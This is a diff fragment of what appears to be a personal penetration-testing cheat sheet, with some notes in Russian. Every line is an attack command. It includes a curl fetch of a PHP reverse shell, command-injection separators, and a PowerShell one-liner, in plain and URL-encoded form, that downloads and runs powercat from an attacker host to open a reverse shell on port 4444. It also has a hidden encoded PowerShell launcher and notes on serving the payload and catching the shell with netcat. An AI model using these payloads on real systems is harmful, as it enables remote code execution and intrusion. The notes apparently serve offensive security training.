@@ -252,8 +252,8 @@ curl http://192.168.180.16/php-reverse-shell.php
 	cmd1;cmd2
 	$(pwd)
 	`pwd`
-IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.45.164/powercat.ps1");powercat -c 192.168.45.164 -p 4444 -e powershell 
-IEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.45.231%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.45.231%20-p%204444%20-e%20powershell
+IEX(New-Object System.Net.Webclient).DownloadString("http://192.168.45.164/powercat.ps1");powercat -c 192.168.45.164 -p 4444 -e powershell 
+IEX(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.45.231%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.45.231%20-p%204444%20-e%20powershell
 	заброска powercat (python -m http.server 80) с запуском reverse shell (nc -nlvp 4444)
 powershell.exe -nop -w hidden -enc "<base64 powershell command>"
 	тоже самое для заброски base64
